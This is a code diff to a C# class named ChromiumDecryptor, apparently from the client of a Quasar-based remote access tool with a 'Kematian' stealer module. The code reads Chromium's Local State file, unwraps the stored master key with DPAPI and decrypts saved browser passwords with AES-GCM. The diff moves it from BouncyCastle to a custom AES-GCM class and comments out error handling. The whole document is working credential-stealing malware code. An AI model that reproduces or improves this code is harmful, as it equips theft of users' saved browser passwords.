@@ -1,8 +1,4 @@
-﻿using Org.BouncyCastle.Crypto;
-using Org.BouncyCastle.Crypto.Engines;
-using Org.BouncyCastle.Crypto.Modes;
-using Org.BouncyCastle.Crypto.Parameters;
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
@@ -20,24 +16,24 @@ namespace Quasar.Client.Kematian.HelpingMethods.Decryption
 
         public ChromiumDecryptor(string localStatePath)
         {
-            try
+            //try
+            //{
+            if (File.Exists(localStatePath))
             {
-                if (File.Exists(localStatePath))
-                {
-                    string localState = File.ReadAllText(localStatePath);
+                string localState = File.ReadAllText(localStatePath);
 
-                    var startIndex = localState.IndexOf("\"encrypted_key\"") + "\"encrypted_key\"".Length + 2;
-                    var endIndex = localState.IndexOf('"', startIndex + 1);
-                    var encKeyStr = localState.Substring(startIndex, endIndex - startIndex);
+                var startIndex = localState.IndexOf("\"encrypted_key\"") + "\"encrypted_key\"".Length + 2;
+                var endIndex = localState.IndexOf('"', startIndex + 1);
+                var encKeyStr = localState.Substring(startIndex, endIndex - startIndex);
 
-                    _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
-                        DataProtectionScope.CurrentUser);
-                }
+                _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
+                    DataProtectionScope.CurrentUser);
             }
-            catch (Exception e)
-            {
-                Debug.WriteLine(e);
-            }
+            //}
+            //catch (Exception e)
+            //{
+            //    Debug.WriteLine(e);
+            //}
         }
 
         public string Decrypt(string cipherText)
@@ -50,11 +46,15 @@ namespace Quasar.Client.Kematian.HelpingMethods.Decryption
                 var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
 
                 var initialisationVector = cipherTextBytes.Skip(3).Take(12).ToArray();
-                var encryptedPassword = cipherTextBytes.Skip(15).ToArray();
+                var encryptedData = cipherTextBytes.Skip(15).ToArray();
 
-                var decryptedPassword = DecryptAesGcm(encryptedPassword, _key, initialisationVector);
+                // Separate the actual encrypted data from the auth tag
+                var actualEncryptedData = encryptedData.Take(encryptedData.Length - 16).ToArray();
+                var authTag = encryptedData.Skip(encryptedData.Length - 16).ToArray();
 
-                return Encoding.UTF8.GetString(decryptedPassword); ;
+                var decryptedPassword = DecryptAesGcm(actualEncryptedData, _key, initialisationVector, authTag);
+
+                return Encoding.UTF8.GetString(decryptedPassword);
             }
             catch (Exception e)
             {
@@ -63,30 +63,28 @@ namespace Quasar.Client.Kematian.HelpingMethods.Decryption
             }
         }
 
-        private byte[] DecryptAesGcm(byte[] encryptedPassword, byte[] key, byte[] nonce)
+        private byte[] DecryptAesGcm(byte[] encryptedPassword, byte[] key, byte[] nonce, byte[] authTag)
         {
             const int KEY_BIT_SIZE = 256;
-            const int MAC_BIT_SIZE = 128;
 
             if (key == null || key.Length != KEY_BIT_SIZE / 8)
                 throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", nameof(key));
             if (encryptedPassword == null || encryptedPassword.Length == 0)
                 throw new ArgumentException("Message required!", nameof(encryptedPassword));
 
-            var cipher = new GcmBlockCipher(new AesEngine());
-            var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
-            cipher.Init(false, parameters);
-            var plainText = new byte[cipher.GetOutputSize(encryptedPassword.Length)];
+            AesGcmBetter AES = new AesGcmBetter();
+            var output = new byte[0];
+
             try
             {
-                var len = cipher.ProcessBytes(encryptedPassword, 0, encryptedPassword.Length, plainText, 0);
-                cipher.DoFinal(plainText, len);
+                output = AES.Decrypt(key, nonce, null, encryptedPassword, authTag);
             }
-            catch (InvalidCipherTextException)
+            catch (Exception e)
             {
+                Debug.WriteLine(e);
                 return null;
             }
-            return plainText;
+            return output;
         }
     }
 }
